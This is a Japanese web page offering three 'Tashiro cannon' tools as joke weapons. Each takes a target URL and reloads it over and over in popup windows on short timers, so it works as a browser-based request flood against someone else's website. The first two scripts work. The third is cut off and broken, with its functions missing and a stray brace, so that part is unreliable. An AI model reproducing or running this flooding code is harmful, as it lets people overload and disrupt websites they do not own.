        <h1>田代級快速雷撃艦ミニニタコα</h1>
        3つの兵器を組み合わせた田代艦。お好みに応じてどうぞ。
        <hr>
        <form name="x">
        主砲・超田代レールガンβ<br><br>
        ターゲットURL:<br>
        <input value="訪問先URL入力" size="50" name="urlEd"><br>自動更新間隔(1000=1秒):
        <input value="1000" size="5" name="ival"><br>砲門数(POPUP):
        <input value="5" size="5" name="pop"> <br>
        <input onclick="kS(1);" value="最終兵器・超田代レールガンβ発射！" type="button"><br>
        <input value="停止中" readonly="" size="50" name="sta"><br><input onclick="kS(0);" value="砲撃停止" type="button">
        </form>
        <hr>
        <form name="y">
        副砲・超田代砲改 Ver.1.21<br><br>
        ターゲットURL:<br>
        <input value="ここに目標URLを入れる" size="50" name="address"><br>
        自動更新間隔:<br>
        <input value="1" size="5" name="inter">秒<br>
        既発射弾数:<br>
        <input type="text" name="fired" value="0"><br>
        <input onclick="display();" value="核兵器・超田代砲発射！" type="button"><br>
        </form>
        <hr>
        <form name="z">
        特殊兵器・田代ファンネルver1.11<br><br>
        ターゲットURL:<input value="http://" size="60" name="url"><br>
        自動更新間隔(1000=1秒):<input value="500" size="6" name="ival"><br>
        <input onclick="one();" value="田代ファンネルx1発射！" type="button">
        <br><input onclick="two();" value="田代ファンネルx2発射！" type="button">
        <br><input onclick="three();" value="田代ファンネルx3発射！" type="button">
        <br><input onclick="four();" value="田代ファンネルx4発射！" type="button">

        <script>
        //主砲・超田代レールガンβ
        var pp, tt, ac, timeid, i; 
        
        function kR() { 
            if (pp == 1) {
                for (i = 0; i < x.pop.value; i++) {
                    w[i].location = x.urlEd.value;
                }
                timeid = setTimeout("kR()", tt); 
                x.sta.value = "自動更新間隔:"+(tt/1000)+"秒　アクセス回数:"+(++ac * x.pop.value)+"回";
            }
        }
        
        function kS(qq) {
            pp = qq; ac = 0; 
            tt = parseFloat(x.ival.value);
            clearTimeout(timeid);
            if (pp == 1) {
                w = new Array(x.pop.value);
                for (i = 0; i < x.pop.value; i++) {
                    w[i] = window.open(x.urlEd.value,'sann'+i,'width=200,height=100');
                }
                kR();
            }
            if (pp == 0) {
                x.sta.value = "砲撃停止";
                for (i = 0; i < x.pop.value; i++) {
                    w[i].close();
                }
            }
        }
        
        //副砲・超田代砲改 Ver.1.21
        var wind, add;
        function display() {
            add = y.address.value;
            wind = window.open(add, 'san', 'width=400, height=400');
            tashiro();
        }
        
        function tashiro() {
            wind.location = add;
            y.fired.value++;
            setTimeout("tashiro();",y.inter.value*1000);
        }

            var tf1 = ("url()",z.url.value);

            tid = setTimeout("one()",z.ival.value);
        }
